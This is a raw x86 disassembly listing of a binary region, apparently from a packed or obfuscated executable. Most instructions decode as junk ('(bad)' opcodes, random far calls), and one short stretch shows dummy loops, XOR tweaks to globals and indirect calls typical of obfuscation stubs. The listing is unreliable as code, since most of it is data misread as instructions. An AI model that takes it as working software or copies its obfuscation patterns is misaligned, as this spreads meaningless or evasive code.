  406a63:	and    al,0x6a
  406a65:	js     0x4069f5
  406a67:	in     eax,dx
  406a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a69:	pop    ds
  406a6a:	outs   dx,DWORD PTR ds:[esi]
  406a6b:	inc    ebp
  406a6c:	(bad)  
  406a6d:	imul   ecx,DWORD PTR [edx],0x5e
  406a70:	pop    ebx
  406a71:	(bad)  
  406a72:	mov    edi,0x81d54f7f
  406a77:	rcl    BYTE PTR [edx+0x63b5df15],cl
  406a7d:	repnz pusha 
  406a7f:	rol    esi,1
  406a81:	cs in  al,dx
  406a83:	in     al,dx
  406a84:	push   esi
  406a85:	retf   0xcf68
  406a88:	nop
  406a89:	fnsave [eax-0x66]
  406a8c:	loop   0x406a54
  406a8e:	xor    eax,0xb2b52af7
  406a93:	cmp    bh,BYTE PTR [ebx+0x43]
  406a96:	test   eax,0xbd9f05de
  406a9b:	jae    0x406b0c
  406a9d:	dec    ebx
  406a9e:	cmp    BYTE PTR [edi+0x5f1017b],bh
  406aa4:	inc    edi
  406aa5:	jbe    0x406a2d
  406aa7:	outs   dx,DWORD PTR ds:[esi]
  406aa8:	mov    WORD PTR [esi],es
  406aaa:	aas    
  406aab:	dec    esi
  406aac:	lds    edi,FWORD PTR [ecx+esi*1-0x62]
  406ab0:	enter  0xc641,0x74
  406ab4:	retf   
  406ab5:	(bad)  
  406ab6:	sub    al,0x4a
  406ab8:	ds pushf 
  406aba:	adc    esi,DWORD PTR [edi+ebp*4-0x6fd857e]
  406ac1:	pop    es
  406ac2:	pop    eax
  406ac3:	mov    esp,0x9d646a67
  406ac8:	(bad)  
  406aca:	je     0x406b35
  406acc:	mov    eax,ds:0xfd8cb206
  406ad1:	pop    eax
  406ad2:	jp     0x406acd
  406ad4:	leave  
  406ad5:	dec    esp
  406ad6:	or     al,0xda
  406ad8:	shl    DWORD PTR [ecx*4-0x6679d828],1
  406adf:	(bad)  
  406ae0:	aad    0x1c
  406ae2:	inc    esp
  406ae3:	lahf   
  406ae4:	mov    dl,0xd3
  406ae6:	call   0xea13a0f5
  406aeb:	dec    edi
  406aec:	sti    
  406aed:	adc    bl,BYTE PTR ss:[ebx+0x1c]
  406af1:	pop    esi
  406af2:	test   al,0xad
  406af4:	das    
  406af5:	dec    eax
  406af6:	xor    BYTE PTR [edx-0x28da3f5e],dl
  406afc:	js     0x406b56
  406afe:	sti    
  406aff:	fwait
  406b00:	bound  ebp,QWORD PTR [ecx+ecx*4]
  406b03:	sub    esp,DWORD PTR [ebp*2-0x4acf7e6]
  406b0a:	adc    al,ch
  406b0c:	jg     0x406b5b
  406b0e:	ins    BYTE PTR es:[edi],dx
  406b0f:	add    ebx,DWORD PTR [eax-0x73]
  406b12:	mov    esp,DWORD PTR ds:0x62d90dfc
  406b18:	or     al,ch
  406b1a:	push   ebx
  406b1b:	pop    es
  406b1c:	cld    
  406b1d:	pop    edi
  406b1e:	(bad)  [edx+0x67]
  406b21:	jl     0x406b44
  406b23:	push   es
  406b24:	pushf  
  406b25:	add    bh,BYTE PTR [esi+0x1f]
  406b28:	in     al,dx
  406b29:	arpl   WORD PTR [edi+0x50],sp
  406b2c:	mov    al,ds:0x7d369064
  406b31:	arpl   sp,ax
  406b33:	lds    ecx,FWORD PTR [eax+0x72ad4ed1]
  406b39:	gs lock push 0x76
  406b3d:	mov    dl,0xd1
  406b3f:	enter  0xabd2,0x87
  406b43:	fcom   QWORD PTR [ebx-0x80]
  406b46:	and    edx,eax
  406b48:	push   esi
  406b49:	jle    0x406b64
  406b4b:	jp     0x406b2e
  406b4d:	jge    0x406b49
  406b4f:	fcmovnb st,st(3)
  406b51:	dec    ecx
  406b52:	pop    ebp
  406b53:	(bad)  
  406b55:	dec    esi
  406b56:	test   DWORD PTR ds:0xc3f73149,esi
  406b5c:	icebp  
  406b5d:	inc    edx
  406b5e:	pop    ds
  406b5f:	push   edi
  406b60:	fiadd  WORD PTR [esp+ecx*4]
  406b63:	or     eax,0xae28a546
  406b68:	daa    
  406b69:	leave  
  406b6a:	dec    ebx
  406b6b:	rcl    DWORD PTR [ebx-0x173932b],0x5a
  406b72:	xor    al,0xf7
  406b74:	sti    
  406b75:	push   edx
  406b76:	imul   ebp,DWORD PTR [edi-0x36],0xffffffa4
  406b7a:	sbb    DWORD PTR [eax-0x52f555ee],ebp
  406b80:	aas    
  406b81:	inc    eax
  406b82:	or     eax,0x3375ed10
  406b87:	cmp    DWORD PTR [esi+0x56],0xffffffa7
  406b8b:	pop    eax
  406b8c:	test   al,0xf7
  406b8e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  406b90:	xchg   ecx,eax
  406b91:	add    esi,DWORD PTR [edi]
  406b93:	pop    ecx
  406b94:	jle    0x406c12
  406b96:	or     al,0xac
  406b98:	jae    0x406c0c
  406b9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9b:	nop
  406b9c:	ret    0x62ac
  406b9f:	aas    
  406ba0:	mov    dl,0xc5
  406ba2:	cmp    cl,BYTE PTR [edx]
  406ba4:	aam    0x3f
  406ba6:	or     bh,BYTE PTR [ebx]
  406ba8:	or     ch,BYTE PTR [ebx-0x4e]
  406bab:	stos   DWORD PTR es:[edi],eax
  406bac:	sbb    bl,BYTE PTR [ebp+0x51077432]
  406bb2:	dec    bp
  406bb4:	push   eax
  406bb5:	push   es
  406bb6:	jmp    0x406b93
  406bb8:	mov    edi,ecx
  406bba:	cmp    DWORD PTR [ecx+ebp*8],0x1dd1fe2b
  406bc1:	aad    0x57
  406bc3:	mov    ds:0x3905f4b9,eax
  406bc8:	adc    BYTE PTR [edx+0x5b426f8e],al
  406bce:	lahf   
  406bcf:	shr    BYTE PTR [eax-0x4e],1
  406bd2:	test   eax,0x148349ed
  406bd7:	cmp    DWORD PTR [edx-0x181dfe2e],ebp
  406bdd:	sub    dl,BYTE PTR [esi]
  406bdf:	adc    eax,0x51d97a9e
  406be4:	sub    DWORD PTR [ecx+edx*4-0x6a],esp
  406be8:	mov    ds:0x759b9368,al
  406bed:	xchg   esp,eax
  406bee:	inc    DWORD PTR [eax-0x3eaa2b40]
  406bf4:	push   edx
  406bf5:	dec    esp
  406bf6:	jmp    0x60aa0930
  406bfb:	fld    TBYTE PTR [edx-0x1ff0de70]
  406c01:	sbb    DWORD PTR [eax],esp
  406c03:	ror    BYTE PTR [edi-0xc442b37],cl
  406c09:	(bad)  
  406c0a:	(bad)  
  406c0c:	mov    ds:0x412224,eax
  406c11:	mov    eax,DWORD PTR [ebp+0xc]
  406c14:	xor    eax,ecx
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	les    eax,FWORD PTR ds:0xca386b69
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	(bad)  
  406c34:	pop    ebx
  406c35:	jb     0x406c5f
  406c37:	jnp    0x406bf6
  406c39:	mov    ds:0x1b3da4ed,eax
  406c3e:	mov    dl,0x74
  406c40:	xor    edx,DWORD PTR [esi+0x18]
  406c43:	fst    DWORD PTR gs:[edi+0x772368e3]
  406c4a:	or     BYTE PTR [esp+eax*2],bl
  406c4d:	ss xchg esi,eax
  406c4f:	clc    
  406c50:	mov    bh,0xe
  406c52:	or     al,0xe0
  406c54:	addr16 push esi
  406c56:	or     bh,ah
  406c58:	xchg   edx,eax
  406c59:	mov    ah,0x99
  406c5b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c5d:	xchg   ebp,eax
  406c5e:	retf   0xeb65
  406c61:	ror    BYTE PTR [ecx],1
  406c63:	and    eax,0x2f274065
  406c68:	call   0x7be7:0x8e3931b7
  406c6f:	hlt    
  406c70:	cmc    
  406c71:	xor    bl,BYTE PTR [eax+0x40]
  406c74:	mov    ch,0xf8
  406c76:	inc    ebx
  406c77:	imul   ecx,DWORD PTR [esi+0x608a7a89],0xffffffb7
  406c7e:	ins    BYTE PTR es:[edi],dx
  406c7f:	sub    al,0xb2
  406c81:	mov    ?,WORD PTR [eax+edx*4]
  406c84:	sbb    ebx,DWORD PTR [eax+0x7b]
  406c87:	mov    ds:0xaba30b85,al
  406c8c:	cmp    BYTE PTR [esi],cl
  406c8e:	sbb    al,0xf8
  406c90:	js     0x406c8f
  406c92:	mov    ?,WORD PTR [edx+0x8]
  406c95:	sti    
  406c96:	or     DWORD PTR ds:0x85bc8713,ebp
  406c9c:	test   eax,0x46b391ee
  406ca1:	inc    edi
  406ca2:	outs   dx,DWORD PTR ds:[esi]
  406ca3:	retf   
  406ca4:	xchg   ecx,eax
  406ca5:	jo     0x406c34
  406ca7:	add    eax,0xa4647af8
  406cac:	cld    
  406cad:	dec    ebx
  406cae:	jmp    0x406c59
  406cb0:	pop    ds
  406cb1:	je     0x406cc3
  406cb3:	dec    ecx
  406cb4:	push   ebp
  406cb5:	ja     0x406c9a
  406cb7:	imul   esp,DWORD PTR [ebx+0x297cdb80],0x4d03ccad
  406cc1:	sbb    edi,DWORD PTR [edi+0x52]
  406cc4:	inc    esp
  406cc5:	pop    eax
  406cc6:	xor    DWORD PTR [edi],edx
  406cc8:	pop    ebx
  406cc9:	sbb    al,0x7b
  406ccb:	icebp  
  406ccc:	rol    DWORD PTR [eax-0x452fb2ef],0x8f
  406cd3:	mov    esp,ecx
  406cd5:	dec    ebp
  406cd6:	xor    al,0x8c
  406cd8:	dec    ecx
  406cd9:	dec    edi
  406cda:	jp     0x406d04
  406cdc:	add    al,0x7d
  406cde:	jae    0x406d56
  406ce0:	xchg   esp,eax
  406ce1:	add    DWORD PTR [edi-0x5d],ebp
  406ce4:	push   ebp
  406ce5:	das    
  406ce6:	sbb    BYTE PTR [ebp-0xb],cl
  406ce9:	iret   
  406cea:	mov    esi,0x3036b229
  406cef:	jno    0x406c97
  406cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cf2:	push   edi
  406cf3:	jl     0x406d60
  406cf5:	leave  
  406cf6:	outs   dx,DWORD PTR ds:[esi]
  406cf7:	xchg   BYTE PTR [eax+0x39],ch
  406cfa:	repnz loop 0x406d5d
  406cfd:	loopne 0x406cd8
  406cff:	aas    
  406d00:	rol    BYTE PTR [ebx],1
  406d02:	inc    ebx
  406d03:	mov    ah,0x2a
  406d05:	inc    edx
  406d06:	inc    esp
  406d07:	and    BYTE PTR [edi],0xc6
  406d0a:	in     eax,0x2
  406d0c:	(bad)  
  406d0d:	jg     0x406cd1
  406d0f:	sbb    BYTE PTR [ebp-0x6eb248f5],ah
  406d15:	imul   esi,DWORD PTR [esi],0x71eb3be9
  406d1b:	aaa    
  406d1c:	cmp    BYTE PTR [edi+0x41],bh
  406d1f:	push   0xb773d419
  406d24:	arpl   WORD PTR [ebx-0x3ca1c113],sp
  406d2a:	ins    BYTE PTR es:[edi],dx
  406d2b:	inc    ecx
  406d2c:	mov    al,0xb6
  406d2e:	ins    DWORD PTR es:[edi],dx
  406d2f:	xor    esi,DWORD PTR [edx]
  406d31:	outs   dx,DWORD PTR ds:[esi]
  406d32:	push   ebx
  406d33:	sub    ah,bl
  406d35:	in     al,0xee
  406d37:	ss sbb eax,0x5c94a14f
  406d3d:	sub    ch,BYTE PTR [edi-0x49]
  406d40:	outs   dx,BYTE PTR ds:[esi]
  406d41:	jge    0x406daf
  406d43:	bound  ebx,QWORD PTR [edx]
  406d45:	jb     0x406ccf
  406d47:	rcl    BYTE PTR [edi-0x38],cl
  406d4a:	xor    al,ah
  406d4c:	xchg   edi,eax
  406d4d:	cs popf 
  406d4f:	sub    eax,0x8af6b9bb
  406d54:	or     DWORD PTR [esi],ebx
  406d56:	fsub   st,st(6)
  406d58:	push   ds
  406d59:	icebp  
  406d5a:	(bad)  [eax+0x9]
  406d5d:	and    DWORD PTR [esi-0x25a771d7],eax
  406d63:	sub    DWORD PTR [eax+0x29],edx
  406d66:	xchg   esp,eax
  406d67:	sbb    al,bl
  406d69:	neg    BYTE PTR [ecx-0x61]
  406d6c:	ret    
  406d6d:	icebp  
  406d6e:	inc    esi
  406d6f:	jp     0x406d0c
  406d71:	mul    BYTE PTR [edx]
  406d73:	sub    DWORD PTR [eax],0x663d4d11
  406d79:	inc    esp
  406d7a:	dec    ebx
  406d7b:	xor    ebx,DWORD PTR [ebp-0x43]
  406d7e:	hlt    
  406d7f:	aam    0xe
  406d81:	aam    0xd5
  406d83:	sbb    al,0x90
  406d85:	inc    eax
  406d86:	dec    edx
  406d87:	pop    eax
  406d88:	imul   ebp,DWORD PTR ds:0xe9ae7de5,0x89839088
  406d92:	mov    bl,0xbf
  406d94:	sbb    ebx,ebp
  406d96:	pop    es
  406d97:	retf   0xf54e
  406d9a:	jp     0x406dd7
  406d9c:	jmp    0x406dcd
  406d9e:	(bad)  
  406d9f:	dec    edi
  406da0:	push   eax
  406da1:	(bad)  
  406da2:	test   al,0xba
  406da4:	cmp    eax,0x8e6ff1f
  406da9:	enter  0xad2b,0x64
  406dad:	dec    esi
  406dae:	aas    
  406daf:	add    al,0xea
  406db1:	or     bl,ah
  406db3:	sbb    edi,DWORD PTR [ecx+esi*8+0x4d2045d2]
  406dba:	mov    edx,0x8c1ab909
  406dbf:	pop    ebp
  406dc0:	pop    edx
  406dc1:	aam    0x16
  406dc3:	hlt    
  406dc4:	cmp    BYTE PTR [edx+edi*2-0x51],cl
  406dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dc9:	pop    ss
  406dca:	cmp    DWORD PTR [edi+0x4c465bf],eax
  406dd0:	and    dh,dh
  406dd2:	call   0x75e3:0xc4225250
  406dd9:	(bad)  
  406dda:	(bad)  
  406ddb:	sub    BYTE PTR fs:[edx],bl
  406dde:	mov    al,ds:0xf06a3f4a
  406de3:	push   cs
  406de4:	push   cs
  406de5:	jmp    0x406d7c
  406de7:	xchg   edx,eax
  406de8:	pop    eax
  406de9:	imul   BYTE PTR [ebp+edx*1+0x2b592ea9]
  406df0:	ss call 0xfc57:0x4f543fd3
  406df8:	imul   esp,DWORD PTR [ecx],0x40
  406dfb:	adc    al,0x54
  406dfd:	push   cs
  406dfe:	inc    esi
  406dff:	adc    edx,DWORD PTR [ebp-0x66]
  406e02:	sub    dl,BYTE PTR [edi+0x44]
  406e05:	sbb    esi,DWORD PTR [edx]
  406e07:	mov    eax,ds:0x84784d7
  406e0c:	or     eax,ebp
  406e0e:	pop    ecx
  406e0f:	add    BYTE PTR [eax+0xf],bl
  406e12:	ss xchg ecx,eax
  406e14:	xchg   ecx,eax
  406e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e16:	push   esp
  406e18:	jmp    0x7990:0xc6279da6
  406e1f:	fidivr WORD PTR ds:0x2dbb5a72
  406e25:	cmc    
  406e26:	aaa    
  406e27:	sbb    esp,esi
  406e29:	lea    ecx,[edx]
  406e2b:	fcomp  DWORD PTR [edx+0x61335b0f]
  406e31:	mov    dh,0x6
  406e33:	pop    DWORD PTR [edi+0x5b]
  406e36:	mov    esi,0xc4d33f19
  406e3b:	popa   
  406e3c:	outs   dx,DWORD PTR ds:[esi]
  406e3d:	pop    esp
  406e3e:	jo     0x406e0f
  406e40:	mov    bl,0x9e
  406e42:	stos   BYTE PTR es:[edi],al
  406e43:	test   eax,0x2bf36f77
  406e48:	or     bh,BYTE PTR [ebx+0x460cf4a4]
  406e4e:	loope  0x406e2d
  406e50:	sub    eax,DWORD PTR [ebp+0x6d]
  406e53:	clc    
  406e54:	test   esi,0xb2bfb8a9
  406e5a:	cld    
  406e5b:	popf   
  406e5c:	adc    esp,ebp
  406e5e:	cmp    BYTE PTR [edi+0x3d],dl
  406e61:	jo     0x406ecf
  406e63:	retf   0x7c26
  406e66:	cmp    ebx,DWORD PTR [edi-0x27a4f22b]
  406e6c:	rcr    bl,1
  406e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e6f:	into   
  406e70:	fld    DWORD PTR [ecx-0x155bc1]
  406e76:	mov    ah,0x2d
  406e78:	cmp    BYTE PTR [eax-0x24],cl
  406e7b:	mov    cl,0xaa
  406e7d:	and    al,cl
  406e7f:	repz int 0xd0
  406e82:	scas   eax,DWORD PTR es:[edi]
  406e83:	fs dec ebx
  406e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e86:	jl     0x406e1f
  406e88:	mov    dh,0xd2
  406e8a:	(bad)  
  406e8c:	fcom   QWORD PTR [edx-0x65]
  406e8f:	icebp  
  406e90:	dec    esi
  406e91:	jnp    0x406e84
  406e93:	mov    cl,0x7a
  406e95:	push   ecx
  406e96:	jo     0x406f0f
  406e98:	jp     0x406efb
  406e9a:	mov    cl,0xb
  406e9c:	gs push edx
  406e9e:	(bad)  
  406e9f:	pop    esp
  406ea0:	inc    ebp
  406ea1:	out    dx,al
  406ea2:	ret    
  406ea3:	push   ss
  406ea4:	into   
  406ea5:	loope  0x406efb
  406ea7:	dec    edi
  406ea8:	push   esp
  406ea9:	inc    esi
  406eaa:	aam    0x35
  406eac:	inc    ebx
  406ead:	inc    BYTE PTR [bp-0x51c2]
  406eb2:	push   edx
  406eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eb4:	pop    edx
  406eb5:	inc    eax
  406eb6:	sub    DWORD PTR [ecx-0x7b],ebp
  406eb9:	test   al,0x49
  406ebb:	push   ebp
  406ebc:	mov    ebp,0xa7d48063
  406ec1:	adc    eax,0x16bd3da9
  406ec6:	mov    BYTE PTR [eax+esi*4],al
  406ec9:	push   0xffffffb8
  406ecb:	and    eax,0x88d517db
  406ed0:	(bad)  
  406ed1:	loopne 0x406eba
  406ed3:	xchg   esp,eax
  406ed4:	fisub  WORD PTR [ebp+ebp*2+0x21]
  406ed8:	daa    
  406ed9:	jge    0x406eff
  406edb:	sbb    al,0x14
  406edd:	mov    ecx,cr4
  406ee0:	aaa    
  406ee1:	jl     0x406e91
  406ee3:	(bad)  
  406ee4:	into   
  406ee5:	leave  
  406ee6:	pop    ss
  406ee7:	clc    
  406ee8:	lds    edi,FWORD PTR [edi+0x4e48738]
  406eee:	jmp    0xb127:0x5218d5d1
  406ef5:	mov    eax,ds:0x337e7093
  406efa:	and    eax,0xa3f209f0
  406eff:	daa    
  406f00:	pop    ss
  406f01:	dec    ebx
  406f02:	lock test BYTE PTR [edi],cl
  406f05:	mov    esi,0xba824428
  406f0a:	das    
  406f0b:	and    esi,DWORD PTR [edx+ebx*2]
  406f0e:	sar    DWORD PTR [eax-0x77af1106],cl
  406f14:	push   0xd7f74704
  406f19:	stc    
  406f1a:	(bad)  [ebx]
  406f1c:	sub    eax,0x26035c87
  406f21:	sti    
  406f22:	mov    es,esi
  406f24:	dec    eax
  406f25:	dec    ebp
  406f26:	punpckhwd mm7,QWORD PTR [eax+eax*8]
  406f2a:	outs   dx,DWORD PTR ds:[esi]
  406f2b:	int3   
  406f2c:	int    0x57
  406f2e:	jmp    0x406f06
  406f30:	sub    DWORD PTR [eax+0x74],esp
  406f33:	fmul   st,st(4)
  406f35:	and    DWORD PTR [esi+edx*1+0x528e6df1],edi
  406f3c:	and    ebp,DWORD PTR [eax+0x57]
  406f3f:	and    al,0x95
  406f41:	stos   DWORD PTR es:[edi],eax
  406f42:	xchg   esp,eax
  406f43:	shl    BYTE PTR [ebp+0x60],0xda
  406f47:	cmc    
  406f48:	add    ebx,DWORD PTR [eax]
  406f4a:	test   eax,0x5a50377b
  406f4f:	sub    edx,DWORD PTR [ecx-0x30]
  406f52:	leave  
  406f53:	or     BYTE PTR [esp+ecx*1-0x63],bl
  406f57:	add    BYTE PTR [eax+0x0],al
  406f5a:	and    dh,0xe8
  406f5d:	sub    eax,0x4cba5636
  406f62:	and    ecx,ebx
  406f64:	or     ebp,DWORD PTR [edx]
  406f66:	call   0x700d:0xd611f54d
  406f6d:	push   0xba07d70
  406f72:	in     ax,0x2
  406f75:	rol    BYTE PTR [ecx-0x4a519ca8],cl
  406f7b:	arpl   WORD PTR [ecx-0x7576d660],di
  406f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f82:	sub    DWORD PTR [edi+0x5d],0xffffffe3
  406f86:	shl    DWORD PTR [ecx+edi*2],cl
  406f89:	sub    edi,edx
  406f8b:	xor    bh,ch
  406f8d:	lahf   
  406f8e:	fst    QWORD PTR [ecx]
  406f90:	xchg   edx,eax
  406f91:	mov    al,0xeb
  406f93:	out    0x9a,eax
  406f95:	mov    WORD PTR [eax],ss
  406f97:	(bad)  
  406f98:	sub    eax,0x92f2227e
  406f9d:	hlt    
  406f9e:	out    0xf2,al
  406fa0:	add    eax,edx
  406fa2:	mov    ds:0x41222c,eax
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430496,0x19
  406fd8:	cmp    DWORD PTR ds:0x430496,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430496,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42eac4
  406ffd:	cmp    DWORD PTR ds:0x430496,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430496
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430496,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430496
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430496,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430556,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43054a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ee18,0x42ee20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ee10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ee1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ee1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ee1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ee1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eba4
  4070a9:	cmp    DWORD PTR ds:0x42ee1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ee1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ee1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ee1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43055a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ee28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ee28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ee28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ee28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ee28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ee24
  407123:	call   DWORD PTR ds:0x42eba8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4304ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430492,0x17
  407147:	cmp    DWORD PTR ds:0x430492,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430492,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42ea04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430492
  407179:	dec    eax
  40717a:	mov    ds:0x430492,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0x68087ff0
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x407210
  4071b2:	outs   dx,BYTE PTR ds:[esi]
  4071b3:	jp     0x4071d2
  4071b5:	mov    ds:0x7fab9c64,eax
  4071ba:	xchg   esi,eax
  4071bb:	and    dl,ch
  4071bd:	jnp    0x4071d1
  4071bf:	xchg   ebp,eax
  4071c0:	adc    DWORD PTR [ebx],ebx
  4071c2:	inc    ebx
  4071c3:	in     al,0x1a
  4071c5:	std    
  4071c6:	add    dl,cl
  4071c8:	mul    BYTE PTR [ebp-0x73]
  4071cb:	push   edx
  4071cc:	adc    eax,0x252a269b
  4071d1:	jle    0x4071b0
  4071d3:	or     cl,BYTE PTR [eax-0x6e]
  4071d6:	mov    ch,0x8d
  4071d8:	inc    edx
  4071d9:	add    BYTE PTR [ecx+0x43],ch
  4071dc:	jo     0x40723b
  4071de:	add    eax,0x142dba18
  4071e3:	pusha  
  4071e4:	jno    0x4071c2
  4071e6:	outs   dx,DWORD PTR ds:[esi]
  4071e7:	call   FWORD PTR [ebx]
  4071e9:	pop    esp
  4071ea:	nop
  4071eb:	mov    ebx,0x38cf24ad
  4071f0:	sahf   
  4071f1:	xor    DWORD PTR fs:[ebp-0x686fc7bc],eax
  4071f8:	call   0xcf50:0xa11d0245
  4071ff:	icebp  
  407200:	mov    edx,0xd2aa5af3
  407205:	in     eax,0x70
  407207:	xchg   ecx,eax
  407208:	mov    edi,0x8b658614
  40720d:	loop   0x4071c1
  40720f:	cmp    bh,BYTE PTR [ebx-0x2]
  407212:	sbb    BYTE PTR [ecx+0x26096c79],dl
  407218:	rol    dl,1
  40721a:	das    
  40721b:	nop
  40721c:	ja     0x4071be
  40721e:	xchg   ecx,eax
  40721f:	les    ebx,FWORD PTR es:[ebp+ecx*4-0x61af039b]
  407227:	lods   eax,DWORD PTR ds:[esi]
  407228:	sahf   
  407229:	retf   0x9c9c
  40722c:	fwait
  40722d:	daa    
  40722e:	push   ebx
  40722f:	xor    dl,0x11
  407232:	std    
  407233:	mov    edx,0xadacdb92
  407238:	or     al,0xa6
  40723a:	jne    0x407244
  40723c:	ror    BYTE PTR [edx],cl
  40723e:	mov    ds:0x59422b64,al
  407243:	xchg   ecx,eax
  407244:	mov    al,ds:0x65815c03
  407249:	jmp    0x4071de
  40724b:	push   ecx
  40724c:	je     0x4071dc
  40724e:	xor    eax,0x1e568cd3
  407253:	and    bl,bh
  407255:	and    bl,BYTE PTR [esp+ecx*2-0x1d]
  407259:	adc    ebx,DWORD PTR [ebp+0x5d]
  40725c:	and    ebp,edx
  40725e:	jb     0x40729e
  407260:	pop    ds
  407261:	or     al,0x78
  407263:	or     esi,DWORD PTR [edi-0x2c]
  407266:	pop    ebx
  407267:	jecxz  0x4072c7
  407269:	jp     0x4072b6
  40726b:	cmc    
  40726c:	push   esp
  40726d:	lds    ecx,FWORD PTR [esi+0x7ee60d5a]
  407273:	rcr    DWORD PTR [ecx],cl
  407275:	adc    eax,0xf5c3b6c8
  40727a:	xchg   BYTE PTR [edx-0x27],ah
  40727d:	fmul   DWORD PTR [ebx-0x1e64a2bf]
  407283:	imul   ebx,edi,0xdcfadc39
  407289:	push   edx
  40728a:	mov    bl,0xa4
  40728c:	lock and ah,BYTE PTR [esi+0x57]
  407290:	test   BYTE PTR [eax-0x57],ah
  407293:	daa    
  407294:	mov    cl,0x9a
  407296:	int3   
  407297:	lock rol BYTE PTR [esi+0x1d9f48c8],1
  40729e:	test   al,0xb1
  4072a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072a1:	and    DWORD PTR [ebx+ebx*2+0x61798ba1],ebp
  4072a8:	lods   eax,DWORD PTR ds:[esi]
  4072a9:	shl    DWORD PTR [esi-0x59fbb127],0x9b
  4072b0:	imul   DWORD PTR [esi+0x4dd96611]
  4072b6:	jl     0x4072d0
  4072b8:	mov    ecx,0x66dedbf6
  4072bd:	pop    esi
  4072be:	jg     0x407298
  4072c0:	pushf  
  4072c1:	fsubr  QWORD PTR [ebx-0x2c]
